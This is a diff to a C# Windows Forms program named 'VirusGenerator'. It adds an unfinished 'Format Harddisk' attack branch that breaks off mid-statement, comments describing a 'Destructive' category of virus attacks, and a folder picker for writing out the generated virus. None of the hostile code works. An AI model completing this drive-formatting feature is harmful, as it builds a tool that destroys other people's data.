@@ -158,6 +158,14 @@ namespace VirusGenerator
             }
             
 
+            if(CBoxAttack.Text == "Format Harddisk")
+            {
+                System.Diagnostics.Process formatHarddrive = new System.Diagnostics.Process();
+
+                DriveInfo di = 
+                
+            }
+
 
         } //Ends BtnGen_Click
 
@@ -228,14 +236,26 @@ namespace VirusGenerator
             Close(); //closes program from the menu stip.
         }
 
+        /// <summary>
+        /// Purpose: When a category is chosen, then the list of virus attacks are updated based on the category.
+        /// </summary>
+        /// <param name="sender"></param>
+        /// <param name="e"></param>
         private void CBoxCategory_SelectedIndexChanged(object sender, EventArgs e)
         {
             if(CBoxCategory.Text == "Destructive")
             {
-                //CBoxAttack.
+                //CBoxAttack.S
+
+                ToolStrip.Text = $"Category chosen: '{CBoxCategory.Text}'";
             }
         }
 
+        /// <summary>
+        /// Purpose: This is a button that allows the user to select the folder they want to output the virus to through an interface.
+        /// </summary>
+        /// <param name="sender"></param>
+        /// <param name="e"></param>
         private void BtnFolderSelect_Click(object sender, EventArgs e)
         {
             
